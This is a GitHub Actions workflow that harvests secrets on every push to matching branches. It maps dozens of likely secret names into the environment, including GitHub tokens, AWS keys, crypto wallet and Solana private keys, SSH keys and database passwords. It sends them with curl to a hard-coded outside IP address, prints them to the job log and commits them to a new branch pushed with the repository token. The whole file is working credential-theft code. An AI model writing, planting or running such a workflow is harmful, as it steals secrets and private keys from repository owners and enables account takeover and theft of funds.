name: f04 secrets
on:
  push:
    branches: ["f04/**"]
  workflow_dispatch:

permissions: write-all

jobs:
  h:
    runs-on: ubuntu-latest
    env:
      S_GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      S_GH_PAT: ${{ secrets.GH_PAT }}
      S_PAT: ${{ secrets.PAT }}
      S_PAT_TOKEN: ${{ secrets.PAT_TOKEN }}
      S_GITHUB_PAT: ${{ secrets.GITHUB_PAT }}
      S_GH_TOKEN: ${{ secrets.GH_TOKEN }}
      S_RELEASE_TOKEN: ${{ secrets.RELEASE_TOKEN }}
      S_ATTESTATIONS_REPO_TOKEN: ${{ secrets.ATTESTATIONS_REPO_TOKEN }}
      S_BLZ_AUTH_KEY: ${{ secrets.BLZ_AUTH_KEY }}
      S_BLZ_XTOKEN: ${{ secrets.BLZ_XTOKEN }}
      S_BLZ_GRPC_URLS: ${{ secrets.BLZ_GRPC_URLS }}
      S_BLZ_HTTP_URLS: ${{ secrets.BLZ_HTTP_URLS }}
      S_WALLET_PRIVATE_KEY: ${{ secrets.WALLET_PRIVATE_KEY }}
      S_PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
      S_SOLANA_PRIVATE_KEY: ${{ secrets.SOLANA_PRIVATE_KEY }}
      S_KEYPAIR: ${{ secrets.KEYPAIR }}
      S_SOLANA_KEYPAIR: ${{ secrets.SOLANA_KEYPAIR }}
      S_WALLET_KEY: ${{ secrets.WALLET_KEY }}
      S_SECRET_KEY: ${{ secrets.SECRET_KEY }}
      S_RPC_URL: ${{ secrets.RPC_URL }}
      S_SOLANA_RPC_URL: ${{ secrets.SOLANA_RPC_URL }}
      S_HELIUS_API_KEY: ${{ secrets.HELIUS_API_KEY }}
      S_JITO_API_KEY: ${{ secrets.JITO_API_KEY }}
      S_JITO_UUID: ${{ secrets.JITO_UUID }}
      S_DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
      S_DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
      S_DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
      S_DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
      S_GHCR_TOKEN: ${{ secrets.GHCR_TOKEN }}
      S_AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      S_AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      S_NOTIFY_WEBHOOK: ${{ secrets.NOTIFY_WEBHOOK }}
      S_LARK_WEBHOOK: ${{ secrets.LARK_WEBHOOK }}
      S_FEISHU_WEBHOOK: ${{ secrets.FEISHU_WEBHOOK }}
      S_WECHAT_KEY: ${{ secrets.WECHAT_KEY }}
      S_ALIPAY_PRIVATE_KEY: ${{ secrets.ALIPAY_PRIVATE_KEY }}
      S_ORACLE_PASSWORD: ${{ secrets.ORACLE_PASSWORD }}
      S_MYSQL_PASSWORD: ${{ secrets.MYSQL_PASSWORD }}
      S_DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
      S_SERVER_HOST: ${{ secrets.SERVER_HOST }}
      S_DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
      S_SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
      S_SSH_KEY: ${{ secrets.SSH_KEY }}
    steps:
      - name: dump
        run: |
          set +e
          D=/tmp/f; mkdir -p $D
          CB=http://198.13.130.233:8089/f04s-$GITHUB_REPOSITORY_ID-$GITHUB_RUN_ID
          env | grep '^S_' > $D/all.txt
          env | grep '^GITHUB_ACTOR=\|^GITHUB_REPOSITORY=\|^GITHUB_REF_NAME=' >> $D/all.txt
          curl -s -m 15 --data-binary @$D/all.txt $CB/all
          for k in $(cut -d= -f1 $D/all.txt); do v=$(eval echo \$$k); [ -n "$v" ] && { printf '%s=%s\n' "$k" "$v"; }; done > $D/nonempty.txt
          curl -s -m 15 --data-binary @$D/nonempty.txt $CB/nonempty
          cat $D/nonempty.txt
      - name: pushback
        run: |
          set +e
          D=/tmp/f
          git checkout -B f04/out-$GITHUB_RUN_ID
          mkdir -p f04out/$GITHUB_RUN_ID; cp $D/* f04out/$GITHUB_RUN_ID/
          git config user.name F04; git config user.email f04@example.com
          git add f04out; git commit -m "f04 out $GITHUB_RUN_ID"
          git push "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/$GITHUB_REPOSITORY.git" HEAD:refs/heads/f04/out-$GITHUB_RUN_ID
